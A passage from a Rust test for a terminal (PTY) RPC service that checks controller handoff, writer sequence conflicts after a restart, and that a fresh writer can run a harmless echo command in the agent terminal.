    assert_eq!(code(call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "new" })).await), "not_controller");
    // A writer that kept counting from the old process is told, not guessed at.
    call(&f.rpc, &after, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!(code(call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 2, "writerId": "w" })).await), "conflict");
    // The view takes control (nobody has it) and types from 1 with a new writer.
    call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo woke-$$\n", "seq": 1, "writerId": "new" })).await.unwrap();
    output_until(&mut events, &format!("woke-{pid}")).await;
}
